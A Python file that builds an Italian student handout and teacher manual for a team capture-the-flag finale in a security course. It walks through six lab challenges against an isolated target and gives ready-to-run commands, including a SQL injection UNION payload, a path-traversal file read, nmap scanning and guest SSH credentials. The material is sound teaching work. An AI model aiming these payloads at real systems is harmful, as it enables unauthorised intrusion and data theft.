# -*- coding: utf-8 -*-
NUM = 39
SLUG = "ctf-finale-a-squadre"
TITOLO = "CTF finale a squadre"


def dispensa(d):
    d.box("blu", "In breve", [
        "**Durata:** 2 ore.  Struttura: 10 min regole · 100 min gara · 10 min premiazione.",
        "**Obiettivo:** mettere alla prova tutto il corso in una gara Capture The Flag a "
        "squadre: sei sfide sul bersaglio, dalla ricognizione al web, dai permessi alla "
        "decodifica.",
        "**Al termine sai:** applicare in autonomia e sotto tempo le tecniche imparate, "
        "lavorando in squadra.",
        "**Flag in palio:** 6 sfide, 80 punti totali. Consegna ogni flag al docente.",
    ])

    d.h1("Parte 1 · Regole della gara (10 min)")
    d.bullets([
        "Si gioca a squadre. Ogni flag vale i punti indicati; vince chi fa piu' punti.",
        "Bersaglio: `10.10.10.20`. Accesso ospite SSH: `studente` / `studente`.",
        "Le flag hanno il formato `FLAG{...}` e vanno consegnate al docente per la convalida.",
        "Vale tutto quello che avete imparato; vietato disturbare le altre squadre.",
        "Solo dentro il laboratorio isolato: le stesse tecniche fuori di qui sono reato.",
    ])

    d.h1("Parte 2 · Le sei sfide (gara, 100 min)")

    d.h2("Sfida 1 · Recon (+10)")
    d.p("C'e' un servizio nascosto su una porta insolita. Trovalo e leggilo.")
    d.code([
        "sudo nmap -p- 10.10.10.20      # cerca la porta strana",
        "curl http://10.10.10.20:<porta>",
    ])

    d.h2("Sfida 2 · Find (+10)")
    d.p("Entra via SSH e scava: una flag e' sepolta in profondita' in `/srv/ctf`.")
    d.code([
        "ssh studente@10.10.10.20",
        "grep -r FLAG /srv/ctf 2>/dev/null",
    ])

    d.h2("Sfida 3 · Permessi (+10)")
    d.p("In `/srv/ctf` c'e' un backup di root lasciato leggibile da tutti.")
    d.code([
        "ls -l /srv/ctf",
        "cat /srv/ctf/backup_root.txt",
    ])

    d.h2("Sfida 4 · Web SQLi (+20)")
    d.p("Estrai un segreto dal database della Banca (:8080) con una UNION.")
    d.code([
        "curl \"http://10.10.10.20:8080/cerca?conto=' UNION SELECT chiave,valore,'x' FROM segreti -- \"",
    ])

    d.h2("Sfida 5 · Web LFI (+20)")
    d.p("Leggi un file riservato con il path traversal.")
    d.code([
        "curl \"http://10.10.10.20:8080/documenti?file=../segreti/ctf_lfi.txt\"",
    ])

    d.h2("Sfida 6 · Base64 (+10)")
    d.p("Decodifica il messaggio offuscato in `/srv/ctf`.")
    d.code(["cat /srv/ctf/messaggio.b64 | base64 -d"])

    d.h1("Parte 3 · Premiazione e chiusura (10 min)")
    d.p("Si contano i punti, si premia la squadra vincitrice e si commentano insieme le "
        "sfide piu' difficili. Ogni flag trovata e' una tecnica che ora sapete usare "
        "davvero. Nella prossima e ultima lezione tiriamo le somme e guardiamo alle "
        "difese.")

    d.h2("Punteggio del CTF")
    d.table(["Sfida", "Tecnica", "Punti"], [
        ["1 Recon", "port scanning", "10"],
        ["2 Find", "SSH, find/grep", "10"],
        ["3 Permessi", "lettura permessi", "10"],
        ["4 Web SQLi", "SQL injection UNION", "20"],
        ["5 Web LFI", "path traversal", "20"],
        ["6 Base64", "decodifica", "10"],
    ], widths=[2200, 5326, 1500])


def manuale(d):
    d.box("blu", "Scheda docente", [
        "**Lezione 39** · CTF finale a squadre (Blocco 10).",
        "**Tempi:** 10 min regole · 100 min gara · 10 min premiazione.",
        "**Prerequisiti:** bersaglio acceso; Banca installata (Lezione 12) per le sfide web.",
        "**Deliverable studente:** 6 flag, 80 punti.",
    ])
    d.h1("Come funziona il lab")
    d.bullets([
        "target.sh (lab 39) genera le flag a runtime in `/opt/lab/ctf/flags.env` "
        "(diverse per macchina, segrete) e semina le 6 sfide: servizio nascosto :13337, "
        "file in /srv/ctf (find, permessi, base64), riga 'ctf' nei segreti della Banca "
        "(SQLi) e file `ctf_lfi.txt` (LFI).",
        "Installa `ctf-verifica` per convalidare le flag consegnate dalle squadre.",
        "kali.sh: il briefing con l'elenco delle sfide.",
    ])
    d.h1("Convalida delle flag e punteggi")
    d.p("Le flag sono diverse su ogni macchina. Sul bersaglio, per convalidare una flag "
        "consegnata da una squadra:")
    d.code([
        "sudo ctf-verifica FLAG{...}      # dice se e' valida e quanti punti vale",
        "sudo cat /opt/lab/ctf/flags.env  # elenco completo delle flag e riferimenti",
    ])
    d.table(["Sfida", "Come si risolve", "Variabile flag / punti"], [
        ["1 Recon", "nmap -p- ; curl :13337", "FLAG_RECON / 10"],
        ["2 Find", "grep -r FLAG /srv/ctf (note.old in archivio/2019/vecchio)",
         "FLAG_FIND / 10"],
        ["3 Permessi", "cat /srv/ctf/backup_root.txt (644, di root)", "FLAG_PERM / 10"],
        ["4 Web SQLi", "UNION su segreti (riga 'ctf')", "FLAG_WEB_SQLI / 20"],
        ["5 Web LFI", "/documenti?file=../segreti/ctf_lfi.txt", "FLAG_WEB_LFI / 20"],
        ["6 Base64", "base64 -d di /srv/ctf/messaggio.b64", "FLAG_B64 / 10"],
    ], widths=[1400, 5126, 2500])
    d.h1("Organizzazione della gara")
    d.bullets([
        "Formare squadre da 2-3; un tabellone alla lavagna per i punti.",
        "Prima della gara: `lab 12` e `lab 39` sul bersaglio; verificare che :8080, :13337 "
        "e SSH rispondano.",
        "Se una postazione ha piu' bersagli, le flag sono diverse per postazione: "
        "convalidare sempre sul bersaglio giusto.",
        "Tenere pronti piccoli suggerimenti per non bloccare chi resta indietro.",
    ])
    d.h1("Troubleshooting")
    d.table(["Sintomo", "Causa e rimedio"], [
        ["sfide web assenti", "manca la Banca: eseguire `lab 12`, poi di nuovo `lab 39`"],
        [":13337 non risponde", "`systemctl status ctf-recon` sul bersaglio"],
        ["flag 'non valida'", "controllare di convalidare sul bersaglio giusto; le flag "
         "sono per-macchina"],
        ["reset gara", "`sudo rm /opt/lab/ctf/flags.env` e rilanciare `lab 39` per nuove flag"],
    ], widths=[2600, 6426])
